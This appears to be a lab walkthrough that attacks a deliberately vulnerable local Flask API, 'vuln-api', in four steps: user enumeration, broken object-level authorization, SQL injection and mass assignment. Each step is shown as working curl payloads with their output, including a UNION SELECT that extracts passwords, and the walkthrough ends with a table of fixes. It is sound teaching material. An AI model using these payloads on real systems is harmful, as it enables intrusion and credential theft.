# Walkthrough: owning vuln-api in four requests

`vuln-api` is the small Flask target in this lab (`127.0.0.1:8083`). It has five
documented bugs. This walkthrough chains three of them, from an anonymous
request to the admin-only flag, then shows the fix for each one.

Start the lab with `labctl up`, then set `B=http://127.0.0.1:8083`.

## 1. Enumerate users (no auth)

```bash
curl -s $B/api/users
# [{"id":1,"is_admin":true,"username":"admin"}]
```

The list endpoint has no authentication, so we already know the admin's ID.

## 2. Read any user's record (broken object-level authorization)

```bash
curl -s $B/api/users/1
# {"id":1,"is_admin":true,"password":"admin123","username":"admin"}
```

`/api/users/<id>` never checks who is asking. Because passwords are also stored
in plaintext, this one request leaks the admin credential.

## 3. SQL injection in search

The source comment suggests `q=anything' OR '1'='1`. That payload returns `[]`.
The server builds:

```sql
SELECT id, username, is_admin FROM users WHERE username LIKE '%anything' OR '1'='1%'
```

The trailing `%'` from the query template makes the last comparison
`'1'='1%'`, which is false. Commenting out the remainder fixes it:

```bash
curl -s "$B/api/search?q=x'%20OR%201=1--%20"
# every user
curl -s "$B/api/search?q=x'%20UNION%20SELECT%20id,password,is_admin%20FROM%20users--%20"
# [{"id":1,"is_admin":true,"username":"admin123"}]  <- password in the username column
```

`UNION` lets us pull any column into the response shape the endpoint already returns.

## 4. Make yourself admin (mass assignment)

```bash
curl -s -X POST $B/api/register -H 'Content-Type: application/json' \
  -d '{"username":"mallory","password":"pw","is_admin":true}'
# {"is_admin":true,"registered":"mallory"}

curl -s "$B/api/flag?user_id=2"
# {"flag":"flag{admin-mallory}"}
```

Registration copies `is_admin` from the request body, and `/api/flag` trusts a
caller-supplied `user_id` instead of a session.

## Fixes

| Bug | Fix |
| --- | --- |
| BOLA on `/api/users/<id>` | Require a session and return the record only when `user_id == session.user_id` or the caller is an admin. Never return the password field. |
| SQL injection in `/api/search` | Bind the pattern as a parameter: `c.execute("... WHERE username LIKE ?", (f"%{q}%",))`. |
| Mass assignment in `/api/register` | Read only `username` and `password`; set `is_admin = 0` server-side. |
| Plaintext passwords | Store `argon2`/`bcrypt` hashes. |
| `/api/flag` trusts the caller | Derive identity from the authenticated session, not a query parameter. |

Every command above was run against the lab's `vuln-api` source on localhost.
